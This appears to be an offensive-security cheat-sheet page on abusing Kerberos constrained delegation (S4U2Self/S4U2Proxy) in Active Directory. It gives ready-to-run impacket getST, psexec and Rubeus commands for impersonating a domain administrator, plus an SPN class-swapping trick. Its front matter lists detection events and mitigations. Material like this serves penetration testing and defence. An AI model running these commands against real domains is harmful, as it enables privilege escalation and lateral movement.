---
title: Constrained delegation (KCD)
category: AD / Delegation
order: 20
tags: [delegation, constrained, s4u, kcd, protocol-transition]
summary: >
  An account with constrained delegation (msDS-AllowedToDelegateTo) can request
  service tickets to the listed SPNs on behalf of any user via S4U2Self +
  S4U2Proxy — including impersonating a Domain Admin to those services.
prerequisites:
  - Control of an account that has msDS-AllowedToDelegateTo set
  - With "protocol transition" (TrustedToAuthForDelegation) you can impersonate without the user's prior auth
tools: [impacket (getST), Rubeus]
detection:
  - S4U2Self/S4U2Proxy (event 4769) from a service account for privileged users
  - New/unexpected values in msDS-AllowedToDelegateTo
mitigation:
  - Minimize delegation; Protected Users / "sensitive" for Tier-0; prefer resource-based
refs:
  - { label: "hackndo — Constrained", url: "https://en.hackndo.com/constrained-unconstrained-delegation/" }
  - { label: "HackTricks — Constrained delegation", url: "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation" }
---

The delegating account can obtain a ticket **to the allowed SPN, as anyone**.
The catch is the SPN restriction — but the service class in an SPN isn't
enforced, so a ticket to `time/HOST` can often be swapped to `cifs/HOST`.

## Find it

```sh
netexec ldap $dc_ip -u $user -p $password --trusted-for-delegation
# LDAP: msDS-AllowedToDelegateTo populated
```

## Abuse (S4U) — impersonate a DA to the target SPN

```sh
# impacket getST: impersonate administrator to the allowed service
getST.py -spn $spn -impersonate administrator -dc-ip $dc_ip \
  $domain/$computer -hashes :$nthash
export KRB5CCNAME=administrator.ccache
```

```sh
# use the ticket (SPN class can often be altered, e.g. cifs -> host)
netexec smb $target -k --use-kcache
psexec.py -k -no-pass $target
```

```powershell
# Rubeus equivalent
Rubeus.exe s4u /user:$computer /rc4:$nthash /impersonateuser:administrator /msdsspn:$spn /ptt
```

> If the account lacks protocol transition, you need S4U2Self to yield a
> forwardable ticket — otherwise impersonation via S4U2Proxy fails.
